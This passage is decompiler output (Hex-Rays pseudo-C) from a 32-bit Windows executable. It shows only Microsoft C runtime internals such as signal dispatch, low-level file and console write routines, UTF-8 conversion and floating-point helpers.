    *_errno() = 22;
    _invalid_parameter_noinfo();
    return -1;
  }
  global_action_nolock = (void (__cdecl **)(int))((char *)v6 + 8);
  v3 = 0;
  v16 = 0;
LABEL_17:
  v13 = (uintptr_t *)global_action_nolock;
  v12 = 0;
  if ( v3 )
  {
    __acrt_lock(3);
    v3 = v16;
  }
  if ( v3 )
  {
    v7 = (void (__cdecl *)(_DWORD))__ROR4__(*v13 ^ __security_cookie, __security_cookie & 0x1F);
    v3 = v16;
  }
  else
  {
    v7 = (void (__cdecl *)(_DWORD))*v13;
  }
  v14 = v7;
  v15 = v7 == (void (__cdecl *)(_DWORD))1;
  if ( v7 == (void (__cdecl *)(_DWORD))1 )
    goto LABEL_38;
  if ( !v7 )
  {
    if ( v3 )
      __acrt_unlock(3);
    _exit(3);
  }
  if ( a1 == 8 || a1 == 11 || a1 == 4 )
  {
    v12 = *((_DWORD *)v1 + 1);
    *((_DWORD *)v1 + 1) = 0;
    if ( a1 != 8 )
      goto LABEL_33;
    v11 = *__fpecode();
    *__fpecode() = 140;
  }
  if ( a1 == 8 )
  {
    v8 = (int)*v1 + 36;
    v9 = (int)*v1 + 144;
    while ( v8 != v9 )
    {
      *(_DWORD *)(v8 + 8) = 0;
      v8 += 12;
    }
    goto LABEL_38;
  }
LABEL_33:
  *v13 = __security_cookie;
LABEL_38:
  if ( v16 )
    __acrt_unlock(3);
  if ( !v15 )
  {
    if ( a1 == 8 )
    {
      v10 = __acrt_getptd();
      ((void (__cdecl *)(int, _DWORD))v14)(8, *(_DWORD *)(v10 + 8));
    }
    else
    {
      v14(a1);
    }
    if ( a1 == 8 || a1 == 11 || a1 == 4 )
    {
      *((_DWORD *)v1 + 1) = v12;
      if ( a1 == 8 )
        *(_DWORD *)(__acrt_getptd() + 8) = v11;
    }
  }
  return 0;
}
// 40D7E3: variable 'v3' is possibly undefined
// 40A4A8: using guessed type int __acrt_getptd(void);
// 40A5FF: using guessed type int __acrt_getptd_noexit(void);
// 40C9EA: using guessed type _DWORD __cdecl __acrt_lock(_DWORD);
// 40CA32: using guessed type _DWORD __cdecl __acrt_unlock(_DWORD);

//----- (0040E1C2) --------------------------------------------------------
DWORD *__cdecl sub_40E1C2(DWORD *a1, int a2, char *a3, int a4)
{
  int v4; // eax
  int v5; // ebx
  int v6; // ecx
  const char *v7; // edi
  int v8; // esi
  size_t v9; // eax
  int v10; // edx
  int v11; // eax
  int v12; // ecx
  int v13; // edi
  int v14; // edx
  int v15; // esi
  char *v16; // edi
  int v17; // edx
  int v18; // edi
  int v19; // esi
  int v20; // ecx
  unsigned int v21; // eax
  signed int v22; // ecx
  char v23; // dl
  int v24; // eax
  const char *v25; // eax
  _BYTE *v26; // esi
  int v27; // edx
  char v28; // al
  int v29; // esi
  bool v30; // zf
  _BYTE *v31; // esi
  int v32; // edx
  char v33; // al
  int v34; // edx
  int v35; // ecx
  DWORD *result; // eax
  struct _Mbstatet *v37; // [esp+0h] [ebp-98h]
  unsigned int v38[2]; // [esp+Ch] [ebp-8Ch] BYREF
  int v39[2]; // [esp+14h] [ebp-84h] BYREF
  int v40; // [esp+1Ch] [ebp-7Ch]
  UINT CodePage; // [esp+20h] [ebp-78h]
  wchar_t v42[2]; // [esp+24h] [ebp-74h] BYREF
  HANDLE hFile; // [esp+28h] [ebp-70h]
  char *SrcCh; // [esp+2Ch] [ebp-6Ch]
  int v45; // [esp+30h] [ebp-68h]
  unsigned int v46; // [esp+34h] [ebp-64h]
  DWORD NumberOfBytesWritten; // [esp+38h] [ebp-60h] BYREF
  DWORD LastError; // [esp+3Ch] [ebp-5Ch]
  int v49; // [esp+40h] [ebp-58h]
  DWORD v50; // [esp+44h] [ebp-54h]
  int v51; // [esp+48h] [ebp-50h]
  int v52; // [esp+4Ch] [ebp-4Ch]
  wchar_t DstCh[2]; // [esp+50h] [ebp-48h] BYREF
  int v54[3]; // [esp+54h] [ebp-44h] BYREF
  char v55; // [esp+60h] [ebp-38h]
  const char *v56; // [esp+64h] [ebp-34h] BYREF
  size_t Size; // [esp+68h] [ebp-30h]
  __int16 v58; // [esp+6Ch] [ebp-2Ch] BYREF
  int cchWideChar; // [esp+70h] [ebp-28h]
  void *Src; // [esp+74h] [ebp-24h]
  unsigned __int8 v61; // [esp+7Bh] [ebp-1Dh]
  CHAR Buffer[8]; // [esp+7Ch] [ebp-1Ch] BYREF
  char v63[8]; // [esp+84h] [ebp-14h] BYREF
  char v64[8]; // [esp+8Ch] [ebp-Ch] BYREF

  SrcCh = a3;
  v51 = a2 >> 6;
  v4 = dword_41DF10[a2 >> 6];
  v52 = 56 * (a2 & 0x3F);
  hFile = *(HANDLE *)(v52 + v4 + 24);
  v46 = (unsigned int)&a3[a4];
  v5 = 0;
  CodePage = GetConsoleCP();
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)v54, 0);
  LastError = 0;
  v6 = *(_DWORD *)(v54[1] + 8);
  v40 = v6;
  v49 = 0;
  v50 = 0;
  v7 = a3;
  Src = a3;
  if ( a3 >= &a3[a4] )
    goto LABEL_51;
  v8 = v49;
  while ( 1 )
  {
    HIBYTE(v58) = *v7;
    *(_DWORD *)DstCh = 0;
    cchWideChar = 1;
    v9 = dword_41DF10[v51];
    Size = v9;
    if ( v6 == 65001 )
    {
      v10 = v52;
      v11 = v52 + v9 + 46;
      v12 = 0;
      v45 = v11;
      do
      {
        if ( !*(_BYTE *)(v11 + v12) )
          break;
        ++v12;
      }
      while ( v12 < 5 );
      v13 = v46 - (_DWORD)Src;
      cchWideChar = v12;
      if ( v12 <= 0 )
      {
        v22 = byte_41D788[*(unsigned __int8 *)Src] + 1;
        Size = v22;
        if ( v22 <= v13 )
        {
          v16 = (char *)Src;
          v38[0] = 0;
          v38[1] = 0;
          v56 = (const char *)Src;
          cchWideChar = (v22 == 4) + 1;
          v21 = __crt_mbstring::__mbsrtowcs_utf8(
                  (__crt_mbstring *)DstCh,
                  (wchar_t *)&v56,
                  (const char **)cchWideChar,
                  (unsigned int)v38,
                  v37);
LABEL_20:
          if ( v21 == -1 )
            goto LABEL_51;
          v7 = &v16[Size - 1];
          goto LABEL_30;
        }
        if ( v13 <= 0 )
          goto LABEL_43;
        v31 = Src;
        do
        {
          v32 = v5 + v10;
          v33 = v31[v5++];
          *(_BYTE *)(v32 + dword_41DF10[v51] + 46) = v33;
          v10 = v52;
        }
        while ( v5 < v13 );
      }
      else
      {
        v56 = (const char *)(byte_41D788[*(unsigned __int8 *)(v52 + Size + 46)] + 1);
        Size = (size_t)&v56[-v12];
        if ( (int)&v56[-v12] <= v13 )
        {
          v14 = 0;
          v15 = v45;
          do
          {
            v64[v14] = *(_BYTE *)(v15 + v14);
            ++v14;
          }
          while ( v14 < v12 );
          v16 = (char *)Src;
          if ( (int)Size > 0 )
          {
            memmove(&v64[v12], Src, Size);
            v12 = cchWideChar;
          }
          if ( v12 > 0 )
          {
            v17 = cchWideChar;
            v18 = 0;
            v19 = v52;
            do
            {
              v20 = v19 + v18++;
              *(_BYTE *)(v20 + dword_41DF10[v51] + 46) = 0;
            }
            while ( v18 < v17 );
            v16 = (char *)Src;
          }
          v39[0] = 0;
          *(_DWORD *)v42 = v64;
          v39[1] = 0;
          cchWideChar = (v56 == (const char *)4) + 1;
          v21 = __crt_mbstring::__mbsrtowcs_utf8(
                  (__crt_mbstring *)DstCh,
                  v42,
                  (const char **)cchWideChar,
                  (unsigned int)v39,
                  v37);
          goto LABEL_20;
        }
        if ( v13 <= 0 )
          goto LABEL_43;
        v26 = Src;
        do
        {
          v27 = v12 + v5 + v10;
          v28 = v26[v5++];
          *(_BYTE *)(v27 + dword_41DF10[v51] + 46) = v28;
          v12 = cchWideChar;
          v10 = v52;
        }
        while ( v5 < v13 );
      }
      v8 = v49;
LABEL_43:
      v29 = v13 + v8;
LABEL_44:
      v30 = v55 == 0;
      v49 = v29;
      goto LABEL_52;
    }
    v23 = *(_BYTE *)(v52 + v9 + 45);
    if ( (v23 & 4) != 0 )
    {
      v63[0] = *(_BYTE *)(v52 + v9 + 46);
      v63[1] = *v7;
      *(_BYTE *)(v52 + Size + 45) = v23 & 0xFB;
      v24 = mbtowc(DstCh, v63, 2u);
      goto LABEL_29;
    }
    v61 = *v7;
    if ( (__pctype_func()[v61] & 0x8000u) == 0 )
    {
      v24 = mbtowc(DstCh, v7, 1u);
LABEL_29:
      if ( v24 == -1 )
        goto LABEL_51;
      goto LABEL_30;
    }
    v56 = v7 + 1;
    if ( (unsigned int)(v7 + 1) >= v46 )
    {
      v34 = v51;
      v35 = v52;
      *(_BYTE *)(v52 + dword_41DF10[v51] + 46) = v61;
      *(_BYTE *)(v35 + dword_41DF10[v34] + 45) |= 4u;
      v29 = v8 + 1;
      goto LABEL_44;
    }
    if ( mbtowc(DstCh, v7, 2u) == -1 )
      goto LABEL_51;
    v7 = v56;
LABEL_30:
    Src = (void *)++v7;
    v25 = (const char *)__acrt_WideCharToMultiByte(CodePage, 0, DstCh, cchWideChar, Buffer, 5, 0, 0);
    v56 = v25;
    if ( !v25 )
      goto LABEL_51;
    if ( !WriteFile(hFile, Buffer, (DWORD)v25, &NumberOfBytesWritten, 0) )
      break;
    v8 = (int)&v7[v50 - (_DWORD)SrcCh];
    v49 = v8;
    if ( NumberOfBytesWritten < (unsigned int)v56 )
      goto LABEL_51;
    if ( HIBYTE(v58) == 10 )
    {
      v58 = 13;
      if ( !WriteFile(hFile, &v58, 1u, &NumberOfBytesWritten, 0) )
        break;
      if ( !NumberOfBytesWritten )
        goto LABEL_51;
      ++v50;
      v49 = ++v8;
    }
    if ( (unsigned int)v7 >= v46 )
      goto LABEL_51;
    v6 = v40;
  }
  LastError = GetLastError();
LABEL_51:
  v30 = v55 == 0;
LABEL_52:
  if ( !v30 )
    *(_DWORD *)(v54[0] + 848) &= ~2u;
  result = a1;
  *a1 = LastError;
  a1[1] = v49;
  a1[2] = v50;
  return result;
}
// 40E2B7: conditional instruction was optimized away because ecx.4>=1
// 40E333: variable 'v37' is possibly undefined
// 41DF10: using guessed type int dword_41DF10[128];
// 40E1C2: using guessed type char var_C[8];

//----- (0040E93B) --------------------------------------------------------
int __cdecl sub_40E93B(int FileHandle, const void *a2, int a3)
{
  int v3; // edi
  int v5; // [esp+10h] [ebp-20h]

  if ( FileHandle == -2 )
  {
    *__doserrno() = 0;
    *_errno() = 9;
    return -1;
  }
  if ( FileHandle < 0
    || FileHandle >= (unsigned int)dword_41E110
    || (v5 = 56 * (FileHandle & 0x3F), (*(_BYTE *)(dword_41DF10[FileHandle >> 6] + v5 + 40) & 1) == 0) )
  {
    *__doserrno() = 0;
    *_errno() = 9;
    _invalid_parameter_noinfo();
    return -1;
  }
  __acrt_lowio_lock_fh(FileHandle);
  v3 = -1;
  if ( (*(_BYTE *)(dword_41DF10[FileHandle >> 6] + v5 + 40) & 1) != 0 )
  {
    v3 = sub_40EA2D(FileHandle, a2, a3);
  }
  else
  {
    *_errno() = 9;
    *__doserrno() = 0;
  }
  __acrt_lowio_unlock_fh(FileHandle);
  return v3;
}
// 40CBC8: using guessed type _DWORD __cdecl __acrt_lowio_lock_fh(_DWORD);
// 40CBEB: using guessed type _DWORD __cdecl __acrt_lowio_unlock_fh(_DWORD);
// 41DF10: using guessed type int dword_41DF10[128];
// 41E110: using guessed type int dword_41E110;

//----- (0040EA2D) --------------------------------------------------------
int __cdecl sub_40EA2D(int FileHandle, const void *a2, int a3)
{
  int v4; // edi
  int v5; // edx
  char v6; // bl
  bool v7; // cc
  _BYTE *v8; // ebx
  DWORD *v9; // eax
  int *p_LastError; // esi
  int v11; // ecx
  int v12; // edx
  int v13; // eax
  int v14; // eax
  int v15; // eax
  void *v16; // ecx
  int *v17; // esi
  DWORD LastError; // [esp+Ch] [ebp-28h] BYREF
  DWORD NumberOfBytesWritten; // [esp+10h] [ebp-24h] BYREF
  int v20; // [esp+14h] [ebp-20h]
  int v21; // [esp+18h] [ebp-1Ch]
  int v22; // [esp+1Ch] [ebp-18h]
  int v23; // [esp+20h] [ebp-14h]
  DWORD nNumberOfBytesToWrite; // [esp+24h] [ebp-10h]
  int v25; // [esp+28h] [ebp-Ch]
  int v26; // [esp+2Ch] [ebp-8h]
  LPCVOID lpBuffer; // [esp+30h] [ebp-4h]

  lpBuffer = a2;
  nNumberOfBytesToWrite = a3;
  if ( !a3 )
    return 0;
  if ( !a2
    || ((v4 = 56 * (FileHandle & 0x3F),
         v26 = FileHandle >> 6,
         v5 = dword_41DF10[FileHandle >> 6],
         v25 = v4,
         v6 = *(_BYTE *)(v5 + v4 + 41),
         v6 == 2)
     || v6 == 1)
    && (a3 & 1) != 0 )
  {
    *__doserrno() = 0;
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return -1;
  }
  if ( (*(_BYTE *)(v5 + v4 + 40) & 0x20) != 0 )
    _lseeki64_nolock(FileHandle, 0i64, 2u);
  v21 = 0;
  v22 = 0;
  v23 = 0;
  if ( write_requires_double_translation_nolock(FileHandle) )
  {
    if ( v6 )
    {
      v7 = (unsigned __int8)(v6 - 1) <= 1u;
      v8 = lpBuffer;
      if ( !v7 )
      {
LABEL_28:
        v11 = v26;
        v12 = v25;
        goto LABEL_29;
      }
      v9 = (DWORD *)write_double_translated_unicode_nolock(&LastError, lpBuffer, nNumberOfBytesToWrite);
    }
    else
    {
      v8 = lpBuffer;
      v9 = sub_40E1C2(&LastError, FileHandle, (char *)lpBuffer, nNumberOfBytesToWrite);
    }
    goto LABEL_14;
  }
  v11 = v26;
  v12 = v25;
  v13 = dword_41DF10[v26];
  if ( *(char *)(v13 + v25 + 40) >= 0 )
  {
    v16 = *(void **)(v13 + v25 + 24);
    v8 = lpBuffer;
    LastError = 0;
    NumberOfBytesWritten = 0;
    v20 = 0;
    if ( !WriteFile(v16, lpBuffer, nNumberOfBytesToWrite, &NumberOfBytesWritten, 0) )
      LastError = GetLastError();
    p_LastError = (int *)&LastError;
    goto LABEL_27;
  }
  v14 = v6;
  v8 = lpBuffer;
  if ( !v14 )
  {
    v9 = (DWORD *)write_text_ansi_nolock(&LastError, FileHandle, lpBuffer, nNumberOfBytesToWrite);
    goto LABEL_14;
  }
  v15 = v14 - 1;
  if ( !v15 )
  {
    v9 = (DWORD *)write_text_utf8_nolock(&LastError, FileHandle, lpBuffer, nNumberOfBytesToWrite);
    goto LABEL_14;
  }
  if ( v15 == 1 )
  {
    v9 = (DWORD *)write_text_utf16le_nolock(&LastError, FileHandle, lpBuffer, nNumberOfBytesToWrite);
LABEL_14:
    p_LastError = (int *)v9;
LABEL_27:
    v21 = *p_LastError;
    v17 = p_LastError + 1;
    v22 = *v17;
    v23 = v17[1];
    goto LABEL_28;
  }
LABEL_29:
  if ( v22 )
    return v22 - v23;
  if ( v21 )
  {
    if ( v21 == 5 )
    {
      *_errno() = 9;
      *__doserrno() = 5;
    }
    else
    {
      __acrt_errno_map_os_error(v21);
    }
    return -1;
  }
  if ( (*(_BYTE *)(dword_41DF10[v11] + v12 + 40) & 0x40) == 0 || *v8 != 26 )
  {
    *_errno() = 28;
    *__doserrno() = 0;
    return -1;
  }
  return 0;
}
// 409036: using guessed type _DWORD __cdecl __acrt_errno_map_os_error(_DWORD);
// 40E56C: using guessed type int __cdecl write_double_translated_unicode_nolock(_DWORD, _DWORD, _DWORD);
// 40E645: using guessed type int __cdecl write_text_ansi_nolock(_DWORD, _DWORD, _DWORD, _DWORD);
// 40E720: using guessed type int __cdecl write_text_utf16le_nolock(_DWORD, _DWORD, _DWORD, _DWORD);
// 40E809: using guessed type int __cdecl write_text_utf8_nolock(_DWORD, _DWORD, _DWORD, _DWORD);
// 41DF10: using guessed type int dword_41DF10[128];

//----- (00410988) --------------------------------------------------------
int __cdecl sub_410988(int a1, int a2)
{
  return sub_410722(a1, a2);
}
// 410722: using guessed type _DWORD __cdecl sub_410722(_DWORD, _DWORD);

//----- (00411687) --------------------------------------------------------
int __cdecl sub_411687(int a1)
{
  int v2; // [esp+4h] [ebp-10h] BYREF
  int *v3; // [esp+8h] [ebp-Ch] BYREF
  int v4; // [esp+Ch] [ebp-8h] BYREF

  if ( a1 == -2 )
  {
    *__doserrno() = 0;
    *_errno() = 9;
  }
  else
  {
    if ( a1 >= 0
      && a1 < (unsigned int)dword_41E110
      && (*(_BYTE *)(dword_41DF10[a1 >> 6] + 56 * (a1 & 0x3F) + 40) & 1) != 0 )
    {
      v4 = a1;
      v3 = &a1;
      v2 = a1;
      return __crt_seh_guarded_call<int>::operator()<_lambda_218ce3db14220d0be481dae8ef3383b6_,_lambda_628dfdc04ba53c8bfc02c9951375f3f5_ &,_lambda_57dc472bd5c9d5f3b2cbca59b8a843ae_>(
               &v2,
               &v3,
               &v4);
    }
    *__doserrno() = 0;
    *_errno() = 9;
    _invalid_parameter_noinfo();
  }
  return -1;
}
// 4115FB: using guessed type _DWORD __stdcall __crt_seh_guarded_call<int>::operator()<_lambda_218ce3db14220d0be481dae8ef3383b6_,_lambda_628dfdc04ba53c8bfc02c9951375f3f5_ &,_lambda_57dc472bd5c9d5f3b2cbca59b8a843ae_>(_DWORD, _DWORD, _DWORD);
// 41DF10: using guessed type int dword_41DF10[128];
// 41E110: using guessed type int dword_41E110;
// 411687: using guessed type int var_8;

//----- (00412308) --------------------------------------------------------
BOOL sub_412308()
{
  char *v0; // ecx

  v0 = (char *)hConsoleOutput;
  if ( hConsoleOutput == (HANDLE)-2 )
  {
    __dcrt_lowio_initialize_console_output();
    v0 = (char *)hConsoleOutput;
  }
  return v0 + 1 != 0;
}

//----- (004125D5) --------------------------------------------------------
unsigned int __cdecl sub_4125D5(unsigned int a1)
{
  unsigned int v1; // esi
  int v2; // edi
  int v3; // ebx
  unsigned int v4; // eax

  v1 = (a1 & 0xC00000 | (a1 >> 2) & 0xFC000) >> 14;
  v2 = 0;
  if ( (a1 & 0x3000) != 0 )
  {
    if ( (a1 & 0x3000) == 4096 )
      v3 = 512;
    else
      v3 = 0;
  }
  else
  {
    v3 = 768;
  }
  v4 = ((a1 & 0xC00000 | (a1 >> 2) & 0xFC000) >> 14) & 0x300;
  if ( (v1 & 0x300) != 0 )
  {
    switch ( v4 )
    {
      case 0x100u:
        v2 = 1024;
        break;
      case 0x200u:
        v2 = 2048;
        break;
      case 0x300u:
        v2 = 3072;
        break;
    }
  }
  return v2 | v3 | (a1 >> 2) & 0x1000 | (32 * (v1 & 1)) | ((a1 & 0xC00000 | (a1 >> 2) & 0xFC000) >> 18) & 1 | (2 * ((v1 >> 5) & 1)) | (8 * ((v1 >> 2) & 1)) | (16 * ((v1 >> 1) & 1)) | (4 * (((a1 & 0xC00000 | (a1 >> 2) & 0xFC000) >> 17) & 1));
}

//----- (00412BD4) --------------------------------------------------------
void __usercall sub_412BD4(char a1@<ch>, int a2@<ebp>)
{
  *(_BYTE *)(a2 - 144) = -2;
  if ( a1 && !isintTOS() )
    JUMPOUT(0x413000);
  _ffexpm1();
  JUMPOUT(0x412F04);
}
// 412C30: control flows out of bounds to 412F04
// 412C52: control flows out of bounds to 413000
// 412D3D: using guessed type int _ffexpm1(void);
// 412D80: using guessed type int isintTOS(void);

//----- (00414D43) --------------------------------------------------------
unsigned __int64 __usercall sub_414D43@<edx:eax>(unsigned __int64 a1@<edx:eax>)
{
  int v1; // ecx
  bool v2; // cc
  char v3; // cl

  v1 = HIDWORD(a1) >> 20;
  HIDWORD(a1) = HIDWORD(a1) & 0xFFFFF | 0x100000;
  v2 = v1 < 1075;
  v3 = v1 - 51;
  if ( v2 )
    return a1 >> (-v3 & 0x1F);
  else
    return a1 << (v3 & 0x1F);
}

// nfuncs=554 queued=97 decompiled=97 lumina nreq=0 worse=0 better=0
// ALL OK, 97 function(s) have been successfully decompiled
